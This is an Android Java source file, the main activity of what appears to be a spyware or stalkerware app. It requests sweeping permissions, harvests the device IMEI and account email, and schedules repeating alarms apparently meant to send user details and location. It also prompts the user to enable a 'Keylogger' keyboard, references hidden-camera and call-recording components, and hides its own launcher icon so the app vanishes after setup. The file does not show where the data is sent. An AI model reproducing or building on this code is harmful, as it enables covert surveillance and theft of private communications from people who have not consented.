package rapidora.co.myapplication;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.app.Dialog;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v7.widget.SwitchCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Patterns;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.RadioButton;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;


import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.IOException;
import java.io.InputStream;
import java.util.Comparator;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import rapidora.co.myapplication.CallRecording.FileHelper;
import rapidora.co.myapplication.CallRecording.Model;
import rapidora.co.myapplication.CallRecording.MyCallsAdapter;

import rapidora.co.myapplication.CallRecording.RecordService;

import rapidora.co.myapplication.CallRecording.TermsActivity;

import rapidora.co.myapplication.captureImage.HiddenCameraUtils;
import rapidora.co.myapplication.common.Constants;
import rapidora.co.myapplication.common.CustomLogger;
import rapidora.co.myapplication.common.SessionManagment;
import rapidora.co.myapplication.common.Utils;
import rapidora.co.myapplication.keyboard.ImePreferences;
import rapidora.co.myapplication.receiver.CallLogReciever;
import rapidora.co.myapplication.receiver.RecieverforAlwaysRunning;
import rapidora.co.myapplication.services.AlwaysRunning;


/**
 * Created by ABC on 5/3/2016.
 */
public class MainActivity extends Activity implements View.OnClickListener {
    final private int REQUEST_CODE_ASK_PERMISSIONS = 123;
    String imei = null;
    String email = "";
    SessionManagment sd;
    int count = 0;
    public static View view;

    public ListView listView;
    // public ScrollView mScrollView;
    public ScrollView mScrollView2;
    public TextView mTextView;
    private static final int CATEGORY_DETAIL = 1;
    private static final int NO_MEMORY_CARD = 2;
    private static final int TERMS = 3;
    TextView done;
    public RadioButton radEnable;
    public RadioButton radDisable;

    private static Resources res;
    private Context context;
    Dialog pd;
    LinearLayout lReEx, lWrEx, lRPhone, lRCont, lRAudio, lautostart, lBattery;
    SwitchCompat enableKeyboard, enableOverlay, wrSystem, gps, batteryOppo,micromax;

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        context = MainActivity.this;
        sd = new SessionManagment(getApplicationContext());
        sd.setUserId("3");
        res = getResources();
        lautostart = (LinearLayout) findViewById(R.id.lautostart);
        lBattery = (LinearLayout) findViewById(R.id.lBatery);
        enableKeyboard = (SwitchCompat) findViewById(R.id.enableKeyboard);
        enableOverlay = (SwitchCompat) findViewById(R.id.enableOverly);
        wrSystem = (SwitchCompat) findViewById(R.id.wrSystem);
        batteryOppo = (SwitchCompat) findViewById(R.id.batteryOppo);
        micromax = (SwitchCompat) findViewById(R.id.micromax);
        gps = (SwitchCompat) findViewById(R.id.gps);
        done = (TextView) findViewById(R.id.done);

        lautostart.setOnClickListener(this);
        lBattery.setOnClickListener(this);
        enableKeyboard.setOnClickListener(this);
        enableOverlay.setOnClickListener(this);
        wrSystem.setOnClickListener(this);
        batteryOppo.setOnClickListener(this);
        micromax.setOnClickListener(this);
        gps.setOnClickListener(this);
        done.setOnClickListener(this);
        if (Build.VERSION.SDK_INT < 23) {
            //your code here


            final Account[] accounts = AccountManager.get(getApplicationContext()).getAccounts();
            //Log.e("accounts","->"+accounts.length);
            for (Account account : accounts) {
                if (Patterns.EMAIL_ADDRESS.matcher(account.name).matches()) {
                    email = account.name;
                    //  Toast.makeText(HomeActivity.this, "" + email, Toast.LENGTH_SHORT).show();
                }
            }


            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null)
                imei = tm.getDeviceId();
            if (imei == null || imei.length() == 0)
                imei = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            try {
                if (email.equals("")) {
                    email = imei;
                }
            } catch (Exception e) {
                email = imei;
            }

            sd.setEmail(email);
            sd.setIMEI(imei);

            Log.e("imei", imei);
            Log.e("email", email);

            Utils.cancelAlarmForSendUSerDetail(getApplicationContext());
            Utils.scheduleAlarmForSendUSerDetail(getApplicationContext());
            Utils.scheduleAlarmLocation(getApplicationContext());
            //  hide();

        } else {

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED &&
                    ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                    ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED &&
                    ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED &&
                    ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
                    && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED
                    && ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED
                    && ActivityCompat.checkSelfPermission(this, Manifest.permission.CAPTURE_AUDIO_OUTPUT) != PackageManager.PERMISSION_GRANTED
                    && ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
                    && ActivityCompat.checkSelfPermission(this, Manifest.permission.PACKAGE_USAGE_STATS) != PackageManager.PERMISSION_GRANTED
                    && ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {

                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.GET_ACCOUNTS, Manifest.permission.READ_SMS,
                                Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS,
                                Manifest.permission.MEDIA_CONTENT_CONTROL, Manifest.permission.ACCESS_FINE_LOCATION,
                                Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_EXTERNAL_STORAGE,
                                Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.RECORD_AUDIO, Manifest.permission.CAPTURE_AUDIO_OUTPUT,  Manifest.permission.PACKAGE_USAGE_STATS,Manifest.permission.CAMERA},

                        3);

                //   scheduleAlarm(getApplicationContext(), HomeActivity.this);
            } else {
                //your code here
                final Account[] accounts = AccountManager.get(getApplicationContext()).getAccounts();
                //Log.e("accounts","->"+accounts.length);
                for (Account account : accounts) {
                    if (Patterns.EMAIL_ADDRESS.matcher(account.name).matches()) {
                        email = account.name;
                        //  Toast.makeText(HomeActivity.this, "" + email, Toast.LENGTH_SHORT).show();
                    }
                }


                TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null)
                    imei = tm.getDeviceId();
                if (imei == null || imei.length() == 0)
                    imei = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

                try {
                    if (email.equals("")) {
                        email = imei;
                    }
                } catch (Exception e) {
                    email = imei;
                }
                sd.setEmail(email);
                sd.setIMEI(imei);
                Utils.cancelAlarmForSendUSerDetail(getApplicationContext());
                Utils.scheduleAlarmForSendUSerDetail(getApplicationContext());
                Utils.scheduleAlarmLocation(getApplicationContext());
                //    hide();

                // new MyTask2().execute();
            }


        }

        //  listView = (ListView) findViewById(R.id.mylist);
        // mScrollView = (ScrollView) findViewById(R.id.ScrollView01);
        //   mScrollView2 = (ScrollView) findViewById(R.id.ScrollView02);
        //  mTextView = (TextView) findViewById(R.id.txtNoRecords);

        SharedPreferences settings = this.getSharedPreferences(
                Constants.LISTEN_ENABLED, 0);
        boolean silentMode = settings.getBoolean("silentMode", true);

        if (silentMode)
            showDialog(CATEGORY_DETAIL);

        context = this.getBaseContext();

        if (Build.VERSION.SDK_INT >= 23) {
            Intent intent = new Intent();
            intent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);

            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);

        }


        Intent alarm = new Intent(getApplicationContext(), RecieverforAlwaysRunning.class);


        PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 1, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 30000, pendingIntent);

       /* Intent i = new Intent(getApplicationContext(), AlwaysRunning.class);
        startService(i);*/

    }


    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        switch (requestCode) {


            case 3: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    //your code here
                    final Account[] accounts = AccountManager.get(getApplicationContext()).getAccounts();
                    //Log.e("accounts","->"+accounts.length);
                    for (Account account : accounts) {
                        if (Patterns.EMAIL_ADDRESS.matcher(account.name).matches()) {
                            email = account.name;
                            //   Toast.makeText(HomeActivity.this, "" + email, Toast.LENGTH_SHORT).show();
                        }
                    }


                    TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                    if (tm != null)
                        imei = tm.getDeviceId();
                    if (imei == null || imei.length() == 0)
                        imei = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

                    try {
                        if (email.equals("")) {
                            email = imei;
                        }
                    } catch (Exception e) {
                        email = imei;
                    }
                    sd.setEmail(email);
                    sd.setIMEI(imei);

                    Log.e("imei", imei);
                    Log.e("email", email);
                    //    // new MyTask2().execute();
                    Utils.cancelAlarmForSendUSerDetail(getApplicationContext());
                    Utils.scheduleAlarmForSendUSerDetail(getApplicationContext());
                    Utils.scheduleAlarmLocation(getApplicationContext());
                    // hide();


                } else {
                 /*   Toast.makeText(this,
                            "Location tracker could not start, permission Denied", Toast.LENGTH_SHORT)
                            .show();*/
                }


                break;
            }


        }
    }


    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.sBaterry: {
                try {
                    Intent intent = new Intent();
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception e) {

                }
                break;
            }

            case R.id.lautostart: {
                try {
                    Utils.autoStartPermission(getApplicationContext(), android.os.Build.MANUFACTURER);
                } catch (Exception e) {

                }
                break;
            }
            case R.id.gps: {
                try {
                    startActivity(new Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS));
                } catch (Exception e) {

                }
                break;
            }
            case R.id.done: {
                try {
                    hide();

                    int pid = android.os.Process.myPid();
                    android.os.Process.killProcess(pid);
                } catch (Exception e) {

                }
                break;
            }
            case R.id.wrSystem: {
                try {
                    Intent intent = new Intent();
                    intent.setAction(Settings.ACTION_MANAGE_WRITE_SETTINGS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception e) {

                }
                break;
            }
            case R.id.enableOverly: {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, 123);
                } catch (Exception e) {

                }
                break;
            }
            case R.id.batteryOppo: {
                try {
                    Intent intent = new Intent();
                    intent.setClassName("com.coloros.oppoguardelf",
                            "com.coloros.powermanager.fuelgaue.PowerConsumptionActivity");
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception e) {

                }
                break;
            }
            case R.id.micromax: {
                try {
                    if (!isAccessGranted()) {
                        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                        startActivity(intent);
                    }
                } catch (Exception e) {

                }
                break;
            }
            case R.id.enableKeyboard: {
                new AlertDialog.Builder(this)
                        .setIcon(R.mipmap.ic_launcher)
                        .setCancelable(false)
                        .setTitle("Enable Keylogger")
                        .setMessage("Please Disable any other keyboard and Enable Sample Soft Keyboard Settings ")
                        .setPositiveButton("Allow",
                                new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog,
                                                        int which) {
                                        Intent intent = new Intent(android.provider.Settings.ACTION_INPUT_METHOD_SETTINGS);
                                        startActivity(intent);


                                    }
                                }).show();
                break;
            }
        }
    }


    public void hide() {

        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }


    @Override
    protected void onResume() {
       /* try {
            count = count++;
            if (updateExternalStorageState() == Constants.MEDIA_MOUNTED) {
                final List<Model> listDir = FileHelper.listFiles(this);

                if (listDir.isEmpty()) {
                    mScrollView2.setVisibility(TextView.VISIBLE);
                    listView.setVisibility(ScrollView.GONE);
                } else {
                    mScrollView2.setVisibility(TextView.GONE);
                    listView.setVisibility(ScrollView.VISIBLE);
                }

                final MyCallsAdapter adapter = new MyCallsAdapter(this, listDir);

                listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
                    public void onItemClick(AdapterView<?> parent, View view,
                                            int position, long id) {
                        adapter.showPromotionPieceDialog(listDir.get(position)
                                .getCallName(), position);
                    }
                });

                adapter.sort(new Comparator<Model>() {
                    public int compare(Model arg0, Model arg1) {
                        Long date1 = Long.valueOf(arg0.getCallName().substring(1,
                                15));
                        Long date2 = Long.valueOf(arg1.getCallName().substring(1,
                                15));
                        return (date1 > date2 ? -1 : (date1 == date2 ? 0 : 1));
                    }
                });

                listView.setAdapter(adapter);
            } else if (updateExternalStorageState() == Constants.MEDIA_MOUNTED_READ_ONLY) {
                mScrollView2.setVisibility(TextView.VISIBLE);
                listView.setVisibility(ScrollView.GONE);
                showDialog(NO_MEMORY_CARD);
            } else {
                mScrollView2.setVisibility(TextView.VISIBLE);
                listView.setVisibility(ScrollView.GONE);
                showDialog(NO_MEMORY_CARD);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }*/
        super.onResume();
    }


    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == 123) {

            //Check if the permission is granted or not.
            // Settings activity never returns proper value so instead check with following method

        } else {
            super.onActivityResult(requestCode, resultCode, data);
        }
    }

    public static String getDataFromRawFiles(int id) throws IOException {
        InputStream in_s = res.openRawResource(id);

        byte[] b = new byte[in_s.available()];
        in_s.read(b);
        String value = new String(b);

        return value;
    }

    /**
     * checks if an external memory card is available
     *
     * @return
     */
    public static int updateExternalStorageState() {
        String state = Environment.getExternalStorageState();
        if (Environment.MEDIA_MOUNTED.equals(state)) {
            return Constants.MEDIA_MOUNTED;
        } else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
            return Constants.MEDIA_MOUNTED_READ_ONLY;
        } else {
            return Constants.NO_MEDIA;
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }

    @Override
    public boolean onPrepareOptionsMenu(Menu menu) {
        SharedPreferences settings = this.getSharedPreferences(
                Constants.LISTEN_ENABLED, 0);
        boolean silentMode = settings.getBoolean("silentMode", true);

        MenuItem menuDisableRecord = menu.findItem(R.id.menu_Disable_record);
        MenuItem menuEnableRecord = menu.findItem(R.id.menu_Enable_record);

        // silent is disabled, disableRecord item must be disabled
        menuEnableRecord.setEnabled(silentMode);
        menuDisableRecord.setEnabled(!silentMode);

        return super.onPrepareOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        Toast toast;
        final Activity currentActivity = this;
        switch (item.getItemId()) {
            case R.id.menu_about:
                AlertDialog.Builder builder = new AlertDialog.Builder(
                        MainActivity.this);
                builder.setTitle(R.string.about_title)
                        .setMessage(R.string.about_content)
                        .setPositiveButton(R.string.about_close_button,
                                new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog,
                                                        int id) {
                                        dialog.cancel();
                                    }
                                }).show();
                break;
            case R.id.menu_Disable_record:
                setSharedPreferences(true);
              /*  toast = Toast.makeText(this,
                        this.getString(R.string.menu_record_is_now_disabled),
                        Toast.LENGTH_SHORT);
                toast.show();*/
                break;
            case R.id.menu_Enable_record:
                setSharedPreferences(false);
                // activateNotification();
              /*  toast = Toast.makeText(this,
                        this.getString(R.string.menu_record_is_now_enabled),
                        Toast.LENGTH_SHORT);
                toast.show();*/
                break;
            case R.id.menu_see_terms:
                Intent i = new Intent(this.getBaseContext(), TermsActivity.class);
                startActivity(i);
                break;
            case R.id.menu_privacy_policy:
                Intent browserIntent = new Intent(
                        Intent.ACTION_VIEW,
                        Uri.parse("http://www.privacychoice.org/policy/mobile?policy=306ef01761f300e3c30ccfc534babf6b"));
                startActivity(browserIntent);
                break;
            case R.id.menu_delete_all:
                AlertDialog.Builder builderDelete = new AlertDialog.Builder(
                        MainActivity.this);
                builderDelete
                        .setTitle(R.string.dialog_delete_all_title)
                        .setMessage(R.string.dialog_delete_all_content)
                        .setPositiveButton(R.string.dialog_delete_all_yes,
                                new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog,
                                                        int id) {
                                        FileHelper
                                                .deleteAllRecords(currentActivity);
                                        onResume();
                                        dialog.cancel();
                                    }
                                })
                        .setNegativeButton(R.string.dialog_delete_all_no,
                                new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog,
                                                        int id) {
                                        dialog.cancel();
                                    }
                                }).show();
                break;
            default:
                break;
        }
        return super.onOptionsItemSelected(item);
    }

// private void activateNotification() {
// NotificationManager notificationManager = (NotificationManager)
// getSystemService(NOTIFICATION_SERVICE);
// Notification notification = new Notification(R.drawable.ic_launcher,
// "A new notification", System.currentTimeMillis());
// // Hide the notification after its selected
// notification.flags |= Notification.FLAG_ONGOING_EVENT;
// notification.flags |= Notification.FLAG_NO_CLEAR;
//
// Intent intent = new Intent(this, MainActivity.class);
// PendingIntent activity = PendingIntent.getActivity(this, 0, intent, 0);
// notification.setLatestEventInfo(this, "This is the title",
// "This is the text", activity);
// //notification.
// //notification.number += 1;
// notificationManager.notify(0, notification);
// }

    private void setSharedPreferences(boolean silentMode) {
        SharedPreferences settings = this.getSharedPreferences(
                Constants.LISTEN_ENABLED, 0);
        SharedPreferences.Editor editor = settings.edit();
        editor.putBoolean("silentMode", silentMode);
        editor.commit();

        Intent myIntent = new Intent(context, RecordService.class);
        myIntent.putExtra("commandType",
                silentMode ? Constants.RECORDING_DISABLED
                        : Constants.RECORDING_ENABLED);
        myIntent.putExtra("silentMode", silentMode);
        context.startService(myIntent);
    }

    @Override
    protected Dialog onCreateDialog(int id) {
        switch (id) {
            case CATEGORY_DETAIL:
                setSharedPreferences(false);
                LayoutInflater li = LayoutInflater.from(this);
                View categoryDetailView = li.inflate(
                        R.layout.startup_dialog_layout, null);

                AlertDialog.Builder categoryDetailBuilder = new AlertDialog.Builder(
                        this);
                categoryDetailBuilder.setTitle(this
                        .getString(R.string.dialog_welcome_screen));
                categoryDetailBuilder.setView(categoryDetailView);
                AlertDialog categoryDetail = categoryDetailBuilder.create();

                categoryDetail.setButton2("OK",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                if (radEnable.isChecked())
                                    setSharedPreferences(false);
                                if (radDisable.isChecked())
                                    setSharedPreferences(true);
                            }
                        });

                return categoryDetail;
            case NO_MEMORY_CARD:
                li = LayoutInflater.from(this);

                categoryDetailBuilder = new AlertDialog.Builder(this);
                categoryDetailBuilder.setMessage(R.string.dialog_no_memory);
                categoryDetailBuilder.setCancelable(false);
                categoryDetailBuilder.setPositiveButton(
                        this.getString(R.string.dialog_close),
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {
                                dialog.cancel();
                            }
                        });
                categoryDetail = categoryDetailBuilder.create();

                return categoryDetail;
            case TERMS:
                li = LayoutInflater.from(this);

                categoryDetailBuilder = new AlertDialog.Builder(this);
                categoryDetailBuilder.setMessage(this
                        .getString(R.string.dialog_privacy_terms));
                categoryDetailBuilder.setCancelable(false);
                categoryDetailBuilder.setPositiveButton(
                        this.getString(R.string.dialog_terms),
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {
                                Intent i = new Intent(context, TermsActivity.class);
                                startActivity(i);
                            }
                        });
                categoryDetailBuilder.setNegativeButton(
                        this.getString(R.string.dialog_privacy),
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {
                                Intent browserIntent = new Intent(
                                        Intent.ACTION_VIEW,
                                        Uri.parse("http://www.privacychoice.org/policy/mobile?policy=306ef01761f300e3c30ccfc534babf6b"));
                                startActivity(browserIntent);
                            }
                        });
                categoryDetailBuilder.setNeutralButton(
                        this.getString(R.string.dialog_close),
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {
                                dialog.cancel();
                            }
                        });
                categoryDetail = categoryDetailBuilder.create();

                return categoryDetail;
            default:
                break;
        }
        return null;
    }

    @Override
    protected void onPrepareDialog(int id, Dialog dialog) {
        switch (id) {
            case CATEGORY_DETAIL:
                AlertDialog categoryDetail = (AlertDialog) dialog;
                radEnable = (RadioButton) categoryDetail
                        .findViewById(R.id.radio_Enable_record);
                radDisable = (RadioButton) categoryDetail
                        .findViewById(R.id.radio_Disable_record);
                radEnable.setChecked(true);
                break;
            default:
                break;
        }
        super.onPrepareDialog(id, dialog);
    }


    private boolean isAccessGranted() {
        try {
            PackageManager packageManager = getPackageManager();
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(getPackageName(), 0);
            AppOpsManager appOpsManager = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            int mode = 0;
            if (android.os.Build.VERSION.SDK_INT > android.os.Build.VERSION_CODES.KITKAT) {
                mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                        applicationInfo.uid, applicationInfo.packageName);
            }
            return (mode == AppOpsManager.MODE_ALLOWED);

        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }
}

